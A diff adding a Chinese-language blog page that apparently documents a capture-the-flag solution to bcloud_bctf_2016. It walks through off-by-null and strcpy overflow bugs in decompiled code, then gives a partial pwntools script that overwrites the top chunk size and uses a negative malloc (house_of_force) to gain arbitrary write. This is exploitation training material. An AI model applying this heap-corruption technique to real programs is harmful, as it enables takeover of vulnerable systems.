@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="bcloud_bctf_2016题目checksec 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  这是道32位的题目，环境是glibc-2.23 首先贴本题出现off-by-null漏洞的输入函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house_of_force">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/08/house-of-force/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="bcloud_bctf_2016题目checksec 12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x8048000)  这是道32位的题目，环境是glibc-2.23 首先贴本题出现off-by-null漏洞的输入函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-06-08T12:38:54.000Z">
+<meta property="article:modified_time" content="2022-06-10T06:22:27.197Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="house_of_force">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/08/house-of-force/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>house_of_force | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/06/08/house-of-force/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          house_of_force
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-08 20:38:54" itemprop="dateCreated datePublished" datetime="2022-06-08T20:38:54+08:00">2022-06-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-10 14:22:27" itemprop="dateModified" datetime="2022-06-10T14:22:27+08:00">2022-06-10</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>checksec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>这是道32位的题目，环境是glibc-2.23</p>
+<p>首先贴本题出现off-by-null漏洞的输入函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">my_read</span><span class="params">(<span class="keyword">int</span> ptr, <span class="keyword">int</span> len, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(ptr + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(i + ptr) = <span class="number">0</span>;	<span class="comment">//off-by-null</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在程序的开始时要求输入usr_name</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80487A1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  my_read(s, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  name_chunk = v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, s);</span><br><span class="line">  sub_8048779(v2);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里就有一个问题，仔细观察局部变量的空间就知道s的截断符被放到了v2中，那么接下来<code>v2 = malloc(0x40u);</code>就会把s的截断符覆盖掉。那么在<code>strcpy(v2, s);</code>这行代码中实际上拷贝到v2中的就相当于<code>s + chunk_addr</code>（注意canary跟v2并不相连，同时经过调试发现跟v2往后几块栈上的数据都为0，所以拷贝到v2就截止了），这里其实还因为strcpy的问题将top chunk size的最低一位给盖成了’’\x00’，但是这并不影响</p>
+<p>输入usr_name这里的洞让我们得到了堆地址，接下来还要输入两个东西</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_804884E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> ptr1[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-9Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> ptr2[<span class="number">68</span>]; <span class="comment">// [esp+60h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(ptr1, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Org:&quot;</span>);</span><br><span class="line">  my_read(ptr1, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Host:&quot;</span>);</span><br><span class="line">  my_read(ptr2, <span class="number">0x40</span>, <span class="number">10</span>);</span><br><span class="line">  v1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  org_chunk = v2;</span><br><span class="line">  host_chunk = v1;</span><br><span class="line">  <span class="built_in">strcpy</span>(v1, ptr2);</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, ptr1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OKay! Enjoy:)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟前面一样的问题，v2会把prt1的截断符盖掉，同时因为这是32位的程序，v2的四个字节中也没有截断符，而且v2跟prt2是相连的，所以在<code>strcpy(v2, ptr1);</code>这里，拷贝到v2中的内容实际上就是<code>ptr1 + v2 + ptr2</code>，而因为prt2有68个字节，所以<code>strcpy(v1, ptr2);</code>这里不会有问题。</p>
+<p>那么显然最后从ptr2开始就会把top chunk的size以及之后的内容盖掉，这里就能用这个洞修改top chunk的size。</p>
+<p>接下来就是add功能函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; heap[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Lack of space. Upgrade your account with just $100 :)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:&quot;</span>);</span><br><span class="line">  size = sub_8048709();</span><br><span class="line">  heap[i] = <span class="built_in">malloc</span>(size + <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !heap[i] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  Size[i] = size;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the content:&quot;</span>);</span><br><span class="line">  my_read(heap[i], size, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Create success, the id is %d\n&quot;</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  dword_804B0E0[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>除此之外还有edit和free功能函数，都很常规而且没有洞，所以不贴了</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>由前面的分析可以知道我们能够得到堆地址，以及能修改top chunk的size，并且在add功能函数中我们可以申请任意大小堆块，以上三个就是house_of_force的利用条件，还需要注意的是在glibc-2.23—2.27中都不存在对top chunk size域合法性的检测，所以可以使用house_of_force，但是似乎从2.29开始就新增这个检测了（我也没仔细看过所以不好说）</p>
+<p>在输入usr_name的时候得到了栈地址，然后在输入Org跟Host的时候可以利用前面讲的溢出盖掉top chunk的size，将其改成<code>0xffffffff</code>之后，我们后续的内存申请就都发生在top chunk中，然后因为申请chunk时没有对size进行检查，所以可以申请一个负数，导致得到的chunk出现在.bss段，这样就控制了数据段上的堆指针，完成任意地址写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.sendafter(<span class="string">&quot;name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Org:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Host:&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">top_chunk = heap_base + <span class="number">0xd8</span></span><br><span class="line">heap_array = <span class="number">0x804B120</span></span><br><span class="line">offset = heap_array - top_chunk</span><br><span class="line">add(offset-<span class="number">0x98</span>,<span class="string">&#x27;aaa&#x27;</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>上面最后的一步申请导致top chunk往低地址抬，接下来再申请一个正的size就可以得到.bss段的chunk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ top_chunk</span><br><span class="line">0x804b090 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0xf34041, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0xff0cbfb0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/house-of-force/" rel="tag"># house_of_force</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/06/08/IO-FILE/" rel="prev" title="IO_FILE">
+      <i class="fa fa-chevron-left"></i> IO_FILE
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/06/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="next" title="刷题记录">
+      刷题记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bcloud-bctf-2016"><span class="nav-number">1.</span> <span class="nav-text">bcloud_bctf_2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">思路</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">36</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
